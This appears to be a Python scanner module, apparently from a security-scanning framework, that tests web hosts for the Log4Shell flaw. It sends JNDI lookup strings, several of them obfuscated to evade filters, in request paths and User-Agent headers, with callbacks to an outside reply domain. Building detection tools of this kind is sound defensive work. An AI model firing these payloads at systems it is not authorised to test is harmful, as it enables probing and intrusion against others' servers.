import json
import logging
from base64 import b64encode
from typing import Tuple, Union, Optional, Dict
from urllib.parse import urlparse

import requests
import urllib3

from job import BoefjeMeta

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)

TIMEOUT = 15
REPLY_FQDN = "cve.stillekat.nl"


def run(boefje_meta: BoefjeMeta) -> Tuple[BoefjeMeta, Union[bytes, str]]:
    input_ = boefje_meta.arguments["input"]
    host = input_["name"]

    identifier = boefje_meta.id

    schemes = ["http", "https"]

    output = {}
    for scheme in schemes:
        url = f"{scheme}://{host}/"
        payloads = get_payloads(url, REPLY_FQDN, identifier)

        checks = [check(url, payload, TIMEOUT) for payload in payloads.values()]
        header_checks = [
            check_with_header(url, "User-Agent", payload, TIMEOUT)
            for payload in payloads.values()
        ]

        output[scheme] = {
            "checks": dict(zip(payloads.keys(), checks)),
            "header_checks": dict(zip(payloads.keys(), header_checks)),
        }

    return boefje_meta, json.dumps(output).encode()


def check_with_header(
    url_input: str, header_name: str, payload: str, timeout: int
) -> Optional[str]:

    try:
        response = requests.get(
            url_input, headers={header_name: payload}, verify=False, timeout=timeout
        )

        return b64encode(response.content).decode()
    except requests.exceptions.ConnectionError as e:
        logging.error(f"HTTP connection to {url_input} URL error: {e}")


def check(url_input: str, payload: str, timeout: int) -> Optional[str]:
    try:
        response = requests.get(f"{url_input}{payload}", verify=False, timeout=timeout)

        return b64encode(response.content).decode()
    except requests.exceptions.ConnectionError as e:
        logging.error(f"HTTP connection to {url_input} URL error: {e}")


def get_payloads(url_input: str, reply_host: str, identifier: str) -> Dict[str, str]:
    payloads = [
        "${{jndi:ldap://{}/test.class}}",
        "${{jndi:dns://{}:53/test.class}}",
        "${{jndi:rmi://{}:1099/test.class}}",
        "${{${{::-j}}ndi:rmi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}di:rmi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}i:rmi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:rmi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}mi://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}i://{}/test.class}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{}/test.class}}",
    ]

    url_parsed = urlparse(url_input)
    combined = f"{identifier}.{url_parsed.hostname}.{reply_host}"
    filled_payloads = [payload.format(combined) for payload in payloads]

    return dict(zip(payloads, filled_payloads))
